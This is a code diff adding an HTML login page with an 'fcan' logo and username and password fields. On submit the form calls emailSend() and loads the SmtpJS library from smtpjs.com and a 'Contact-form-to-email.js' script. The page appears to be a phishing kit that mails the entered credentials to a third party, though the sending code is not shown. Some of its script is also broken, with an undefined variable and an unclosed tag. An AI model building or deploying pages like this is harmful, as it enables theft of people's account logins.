@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="img" href="fcan-logo-transp.png" />
+
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Home</title>
+
+
+
+
+  <script type="text/javascript">
+    window.onload = function () {
+      console.log('working');
+      const btn = document.querySelector('button')
+      const phoneInput = document.querySelector('#email')
+      document.getElementById('form').addEventListener('submit', function (event) {
+        btn.textContent = 'Loading...';
+        localStorage.setItem('email', emailInput.value)
+      });
+    }
+  </script>
+  <script type="module" crossorigin src="main.js"></script>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body class="bg-gray-100">
+
+  <div class="w-[90%] max-w-md mx-auto pt-5">
+    <div class="mt-5"></div>
+      <form id="form" onsubmit="emailSend(); reset(); return false;" class="mt-44">
+
+      <div class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6">
+        <img class="imglogo" src="fcan-logo-transp.png">
+        <p class="font-bold text-xl mb-3">Login</p>
+        <div class="ctn relative">
+          <input required minlength="5" id="email" name="phone" type="text"
+            class="w-full rounded-md p-4 outline-none pl-12 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
+            placeholder="Username">
+          <img src="avatarr-6d40c2fd.svg" class="absolute top-1/2 bottom-1/2 left-3 my-auto">
+        </div>
+
+        <div class="ctn relative">
+          <input required minlength="5" id="pass" name="pass" type="password"
+            class="w-full rounded-md p-4 outline-none pl-12 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
+            placeholder="Password">
+          <img src="key-939a1f26.svg" class="absolute top-1/2 bottom-1/2 left-3 my-auto">
+          <img onclick="togglePass()" src="eyes-a95130fc.svg" class="absolute top-1/2 bottom-1/2 right-3 my-auto">
+        </div>
+        <p class="pt-7 text-primary font-semibold text-center">Forgot Credentials</p>
+        <button disabled class="bg-primary text-white w-full rounded-md p-4 disabled:opacity-80">Login</button>
+
+      </div>
+
+    </form>
+  </div>
+
+        <script src="https://smtpjs.com/v3/smtp.js"
+        </script>
+        <script src="Contact-form-to-email.js"></script>
+        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+</body>
+<script>
+  function togglePass() {
+    const passInput = document.querySelector('#pass')
+    let type = passInput.type === "password" ? "text" : "password"
+    passInput.setAttribute("type", type)
+  }
+</script>
+
+</html>
